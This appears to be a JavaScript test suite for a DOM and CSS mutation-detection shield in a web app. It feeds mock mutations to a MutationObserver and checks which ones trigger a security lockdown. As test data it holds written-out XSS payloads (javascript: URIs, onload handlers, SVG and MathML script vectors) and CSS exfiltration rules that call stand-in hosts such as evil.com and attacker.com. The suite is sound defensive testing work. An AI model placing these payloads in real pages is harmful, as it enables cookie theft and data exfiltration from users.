import './mock_window.js';
import sentinel from './src/utils/security.js';

const { startMutationShield } = sentinel;

console.log("=========================================");
console.log("🛡️ RUNNING ADCE-MS (ACTIVE DOM & CSS EXFILTRATION MUTATION SHIELD) TEST SUITE");
console.log("=========================================");

let passed = true;
let lockdownCount = 0;

// Intercept voro-security-lockdown event to track lockdown triggers
if (typeof window !== 'undefined') {
  window.addEventListener('voro-security-lockdown', () => {
    lockdownCount++;
  });
}

// Mock MutationObserver implementation to drive test mutations
let currentObserverCallback = null;

global.MutationObserver = class MockMutationObserver {
  constructor(callback) {
    currentObserverCallback = callback;
    this.observed = false;
  }
  observe(target, options) {
    this.observed = true;
  }
  disconnect() {
    this.observed = false;
  }
};

// Initialize the shield
startMutationShield();

if (!currentObserverCallback) {
  console.error("❌ Failed to initialize MutationObserver in test runner!");
  process.exit(1);
}

const runMutationTest = (testName, mutationPayload, expectedLockdown) => {
  const initialLockdownCount = lockdownCount;

  // Trigger mutation callback
  currentObserverCallback([mutationPayload]);

  const triggered = lockdownCount > initialLockdownCount;
  if (triggered === expectedLockdown) {
    console.log(`  ✅ Passed: ${testName} (Lockdown triggered: ${triggered})`);
  } else {
    console.error(`  ❌ Failed: ${testName} (Expected lockdown: ${expectedLockdown}, Got: ${triggered})`);
    passed = false;
  }
};

console.log("\n🟢 Test Category 1: Executable Tag Injections");
runMutationTest("Script Tag Injection (<script>)", {
  type: 'childList',
  addedNodes: [{ nodeType: 1, tagName: 'SCRIPT', attributes: [] }]
}, true);

runMutationTest("Nested Script Tag Inside Container (<div><script>...)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'DIV',
    attributes: [],
    querySelectorAll: (selector) => [{ nodeType: 1, tagName: 'SCRIPT', attributes: [] }]
  }]
}, true);

runMutationTest("Iframe Injection (<iframe>)", {
  type: 'childList',
  addedNodes: [{ nodeType: 1, tagName: 'IFRAME', attributes: [] }]
}, true);

runMutationTest("Object Tag Injection (<object>)", {
  type: 'childList',
  addedNodes: [{ nodeType: 1, tagName: 'OBJECT', attributes: [] }]
}, true);

runMutationTest("Form Tag Injection (<form>)", {
  type: 'childList',
  addedNodes: [{ nodeType: 1, tagName: 'FORM', attributes: [] }]
}, true);

runMutationTest("Meta Refresh Injection (<meta>)", {
  type: 'childList',
  addedNodes: [{ nodeType: 1, tagName: 'META', attributes: [] }]
}, true);


console.log("\n🟢 Test Category 2: Attribute Tampering & URI Schemes");
runMutationTest("Inline Event Handler (onload)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'IMG',
    attributes: [{ name: 'onload', value: 'alert(1)' }]
  }]
}, true);

runMutationTest("Nested Inline Event Handler Inside Span (<span><img onload=.../>)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'SPAN',
    attributes: [],
    querySelectorAll: (selector) => [{
      nodeType: 1,
      tagName: 'IMG',
      attributes: [{ name: 'onload', value: 'alert(1)' }]
    }]
  }]
}, true);

runMutationTest("JavaScript URI Scheme (javascript:)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'A',
    attributes: [{ name: 'href', value: 'javascript:alert(document.cookie)' }]
  }]
}, true);

runMutationTest("VBScript URI Scheme (vbscript:)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'A',
    attributes: [{ name: 'href', value: 'vbscript:msgbox(1)' }]
  }]
}, true);

runMutationTest("Data HTML Scheme (data:text/html)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'IFRAME',
    attributes: [{ name: 'src', value: 'data:text/html,<script>alert(1)</script>' }]
  }]
}, true);

runMutationTest("External Form Action Hijacking", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'DIV',
    attributes: [{ name: 'action', value: 'https://evil.com/exfiltrate' }]
  }]
}, true);


console.log("\n🟢 Test Category 3: SVG & MathML Vector Injections");
runMutationTest("SVG Embedded Script Vector", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'SVG',
    innerHTML: '<script>alert("svg_xss")</script>'
  }]
}, true);

runMutationTest("SVG Set Attribute Vector", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'SVG',
    innerHTML: '<set attributeName="href" to="javascript:alert(1)" />'
  }]
}, true);

runMutationTest("MathML Annotation-XML Vector", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'MATH',
    innerHTML: '<annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml>'
  }]
}, true);


console.log("\n🟢 Test Category 4: CSS Data Exfiltration & Execution Vectors");
runMutationTest("CSS External @import Exfiltration", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'STYLE',
    textContent: '@import url("https://evil.com/steal.css");'
  }]
}, true);

runMutationTest("Nested Style Tag CSS Exfiltration Inside Div (<div><style>@import...)", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'DIV',
    attributes: [],
    querySelectorAll: (selector) => [{
      nodeType: 1,
      tagName: 'STYLE',
      textContent: '@import url("https://evil.com/steal.css");'
    }]
  }]
}, true);

runMutationTest("CSS External Background URL Exfiltration", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'STYLE',
    textContent: 'input[value^="a"] { background-image: url("https://evil.com/exfil?char=a"); }'
  }]
}, true);

runMutationTest("CSS Expression Trigger (expression())", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'STYLE',
    textContent: 'body { width: expression(alert(1)); }'
  }]
}, true);

runMutationTest("Inline Style Attribute External CSS Exfiltration", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'DIV',
    attributes: [{ name: 'style', value: 'background-image: url("https://evil-analytics.com/track");' }]
  }]
}, true);

runMutationTest("Style Node CharacterData Text Mutation Exfiltration", {
  type: 'characterData',
  target: {
    nodeValue: 'body { background: url("https://attacker.com/leak"); }',
    parentNode: { nodeType: 1, tagName: 'STYLE' }
  }
}, true);


console.log("\n🟢 Test Category 5: Safe Legitimate DOM Mutations");
runMutationTest("Safe Standard Component Element", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'DIV',
    attributes: [
      { name: 'class', value: 'p-6 bg-voro-card text-white rounded-xl' },
      { name: 'id', value: 'dashboard-card' }
    ]
  }]
}, false);

runMutationTest("Safe Relative CSS Asset in Style Tag", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'STYLE',
    textContent: 'body { background-image: url("/assets/voro-bg.png"); }'
  }]
}, false);

runMutationTest("Safe Data URI Font in Style Tag", {
  type: 'childList',
  addedNodes: [{
    nodeType: 1,
    tagName: 'STYLE',
    textContent: '@font-face { font-family: "VoroFont"; src: url("data:font/woff2;base64,dDB1M2E..."); }'
  }]
}, false);

console.log("\n=========================================");
if (passed) {
  console.log("🎉 ALL ADCE-MS SECURITY VERIFICATION TESTS PASSED SUCCESSFULLY!");
  process.exit(0);
} else {
  console.error("❌ ADCE-MS SECURITY VERIFICATION FAILED!");
  process.exit(1);
}
console.log("=========================================");
